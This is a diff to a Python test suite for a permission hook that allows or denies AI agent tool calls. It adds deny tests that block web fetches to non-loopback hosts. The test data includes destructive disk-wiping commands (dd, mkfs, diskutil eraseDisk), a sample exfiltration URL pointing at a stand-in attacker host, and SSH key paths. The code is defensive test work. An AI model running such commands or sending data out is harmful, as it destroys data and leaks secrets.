@@ -152,6 +152,13 @@ DENY_CASES: list[tuple[str, JsonObject, str]] = [
     ("Bash", {"command": "dd if=/dev/zero of=/dev/disk2"}, "destructive"),
     ("Bash", {"command": "mkfs.ext4 /dev/sdb"}, "destructive"),
     ("Bash", {"command": "diskutil eraseDisk JHFS+ x /dev/disk3"}, "destructive"),
+    # -- WebFetch/WebSearch: default-deny a non-loopback host ----------------
+    (
+        "WebFetch",
+        {"url": "https://attacker.example.com/?leak=secretdata"},
+        "exfiltration",
+    ),
+    ("WebSearch", {"query": "python regex lookahead"}, "exfiltration"),
 ]
 
 # --------------------------------------------------------------------------- #
@@ -202,8 +209,9 @@ ALLOW_CASES: list[tuple[str, JsonObject]] = [
     ("Write", {"file_path": "docs/security.md", "content": "we store keys in ~/.ssh"}),
     ("Grep", {"pattern": "id_rsa", "path": "src"}),
     ("Glob", {"pattern": "**/*.py"}),
-    ("WebFetch", {"url": "https://docs.python.org/3/library/re.html"}),
-    ("WebSearch", {"query": "python regex lookahead"}),
+    # A WebFetch to loopback is exempt from the non-loopback host lockdown
+    # (see WEB_FETCH_HOST_CASES below for the lockdown's own coverage).
+    ("WebFetch", {"url": "http://127.0.0.1:8082/docs"}),
 ]
 
 
@@ -259,6 +267,85 @@ def test_unknown_tool_still_scans_for_secret_paths() -> None:
     decision = evaluate("SomeMcpTool", {"path": "~/.ssh/id_rsa"})
     assert not decision.allowed
     assert decision.category == "secret-file"
+
+
+# --------------------------------------------------------------------------- #
+# WebFetch/WebSearch non-loopback host lockdown -- env-configurable, so these  #
+# pass ``env`` explicitly rather than relying on ``evaluate``'s default        #
+# (an empty mapping) or on the test process's ambient environment.             #
+# --------------------------------------------------------------------------- #
+def test_web_fetch_external_host_denied_by_default() -> None:
+    decision = evaluate(
+        "WebFetch", {"url": "https://attacker.example.com/?leak=x"}, env={}
+    )
+    assert not decision.allowed
+    assert decision.category == "exfiltration"
+    assert "attacker.example.com" in decision.reason
+
+
+def test_web_search_denied_by_default() -> None:
+    decision = evaluate("WebSearch", {"query": "anything at all"}, env={})
+    assert not decision.allowed
+    assert decision.category == "exfiltration"
+
+
+@pytest.mark.parametrize(
+    "url",
+    [
+        "http://127.0.0.1:8082/health",
+        "http://localhost:8082/v1/models",
+        "http://[::1]:8082/",
+        "https://LOCALHOST/x",
+    ],
+)
+def test_web_fetch_loopback_allowed(url: str) -> None:
+    decision = evaluate("WebFetch", {"url": url}, env={})
+    assert decision.allowed, f"expected allow for {url}: {decision.reason}"
+
+
+def test_web_fetch_allowlisted_host_allowed() -> None:
+    env = {"FCC_WEBFETCH_ALLOW_HOSTS": "docs.python.org, example.com"}
+
+    exact = evaluate(
+        "WebFetch", {"url": "https://docs.python.org/3/library/re.html"}, env=env
+    )
+    assert exact.allowed
+
+    subdomain = evaluate("WebFetch", {"url": "https://sub.example.com/x"}, env=env)
+    assert subdomain.allowed
+
+    # A suffix collision (attacker.net contains "example.com" as a path, not a
+    # host) must not be treated as allowlisted.
+    lookalike = evaluate("WebFetch", {"url": "https://evil-example.com/x"}, env=env)
+    assert not lookalike.allowed
+
+
+def test_web_fetch_lockdown_disabled_via_toggle() -> None:
+    env = {"FCC_ALLOW_WEB_FETCH": "1"}
+
+    fetch_decision = evaluate(
+        "WebFetch", {"url": "https://attacker.example.com/?leak=x"}, env=env
+    )
+    assert fetch_decision.allowed
+
+    search_decision = evaluate("WebSearch", {"query": "anything"}, env=env)
+    assert search_decision.allowed
+
+
+def test_web_fetch_lockdown_wired_through_hook_payload_env(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setenv("FCC_ALLOW_WEB_FETCH", "1")
+    raw = json.dumps(
+        {
+            "tool_name": "WebFetch",
+            "tool_input": {"url": "https://attacker.example.com/"},
+        }
+    )
+
+    decision = evaluate_hook_payload(raw)
+
+    assert decision.allowed
 
 
 def test_render_deny_output_matches_pretooluse_contract() -> None:
